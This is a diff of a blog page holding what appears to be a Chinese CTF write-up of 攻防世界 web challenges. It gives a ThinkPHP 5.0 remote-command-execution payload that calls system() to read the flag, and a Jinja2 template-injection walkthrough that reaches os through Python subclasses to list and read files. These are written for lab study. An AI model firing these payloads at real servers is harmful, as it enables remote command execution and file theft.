@@ -98,7 +98,7 @@
 			
 			
 				<i class="iconfont icon-words"></i>
-				<span class="words">55
+				<span class="words">1409
 				</span>
 			
 		</div>
@@ -134,8 +134,40 @@
 					<p>攻防世界web进阶区WP(part3)</p>
 <a id="more"></a>
 
-<h3 id="0x00-ics-07"><a href="#0x00-ics-07" class="headerlink" title="0x00 ics-07"></a>0x00 ics-07</h3><p>题目描述：工控云管理系统项目管理页面解析漏洞</p>
-  	
+<h3 id="0x00-php-rce"><a href="#0x00-php-rce" class="headerlink" title="0x00 php_rce"></a>0x00 php_rce</h3><p>页面提示Think PHP V5，结合题目rce，猜测为TP5.0 rce漏洞</p>
+<p><img src="https://i.postimg.cc/hG6rcF6x/1.png" alt></p>
+<p>网上搜索到的利用payload：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>
+
+<p>修改下执行的命令即可获得flag</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=cat ../../../flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.postimg.cc/J0W5HN1z/2.png" alt></p>
+<h3 id="0x01-Web-python-template-injection"><a href="#0x01-Web-python-template-injection" class="headerlink" title="0x01 Web_python_template_injection"></a>0x01 Web_python_template_injection</h3><p>参考<a href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener">从零学习flask模板注入</a>和<a href="https://xz.aliyun.com/t/3679#toc-11" target="_blank" rel="noopener">flask之ssti模版注入从零到入门</a></p>
+<p>基础知识：在Jinja2模板引擎中，<code>{{}}</code>是变量包裹标识符。<code>{{}}</code>并不仅仅可以传递变量，还可以执行一些简单的表达式</p>
+<p>测试一下，构造参数<strong>{{1+2}}</strong></p>
+<p><img src="https://i.postimg.cc/PxDMq3n7/3.png" alt></p>
+<p>成功执行</p>
+<p>可以查看flask中的一些全局变量</p>
+<p><img src="https://i.postimg.cc/dtw9qjHW/4.png" alt></p>
+<p>几个魔术方法</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="strong">__class__</span>  返回类型所属的对象</span><br><span class="line"><span class="strong">__mro__</span>    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line"><span class="strong">__base__</span>   返回该对象所继承的基类</span><br><span class="line">// <span class="strong">__base__</span>和<span class="strong">__mro__</span>都是用来寻找基类的</span><br><span class="line"></span><br><span class="line"><span class="strong">__subclasses__</span>   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line"><span class="strong">__init__</span>  类的初始化方法</span><br><span class="line"><span class="strong">__globals__</span>  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">获取字符串的类对象</span><br><span class="line">&#123;&#123;<span class="string">''</span>.<span class="variable">__class__</span>&#125;&#125; ——&gt; &lt;<span class="built_in">type</span> <span class="string">'str'</span>&gt; </span><br><span class="line">寻找基类</span><br><span class="line">&#123;&#123;<span class="string">''</span>.<span class="variable">__class__</span>.<span class="variable">__mro__</span>&#125;&#125; ——&gt; &lt;<span class="built_in">type</span> <span class="string">'str'</span>&gt;,&lt;<span class="built_in">type</span> <span class="string">'basestring'</span>&gt;,&lt;<span class="built_in">type</span> <span class="string">'object'</span>&gt;</span><br><span class="line">寻找可用引用</span><br><span class="line">&#123;&#123;<span class="string">''</span>.<span class="variable">__class__</span>.<span class="variable">__mro__</span>[<span class="number">2</span>].<span class="variable">__subclasses__</span>()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/vHhtDxCG/5.png" class="lazyload"></p>
+<p>注意到<strong>&lt;type ‘file’&gt;</strong>可以读取文件，可以在引用里寻找包含<strong>os</strong>模块的脚本以执行命令</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">         <span class="keyword">if</span> <span class="string">'os'</span> <span class="keyword">in</span> item.__init__.__globals__:</span><br><span class="line">             <span class="keyword">print</span> num,item</span><br><span class="line">         num+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'-'</span></span><br><span class="line">        num+=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>可以找到</p>
+<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">71 &lt;class <span class="emphasis">'site._Printer'</span>&gt;</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">76 &lt;class <span class="emphasis">'site.Quitter'</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>读取文件 <code>{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}</code></p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/dQ8BPxBk/6.png" class="lazyload"></p>
+<p>读取即可</p>
+<p><code>{{''.__class__.__mro__[2].__subclasses__()[40]('fl4g').read()}}</code></p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/j2QQHD5Q/7.png" class="lazyload"></p>
+<h3 id="0x02-Zhuanxv"><a href="#0x02-Zhuanxv" class="headerlink" title="0x02 Zhuanxv"></a>0x02 Zhuanxv</h3>  	
 					
 	  </div>     
 	  
@@ -254,7 +286,7 @@
      <div class="mobile-menu">      
 
       
-      <img class="mobile-menu-icon" src="/images/favicon.png">  
+      <img class="mobile-menu-icon lazyload" src="/images/placeholder.png" data-src="/images/favicon.png">  
       
 
          
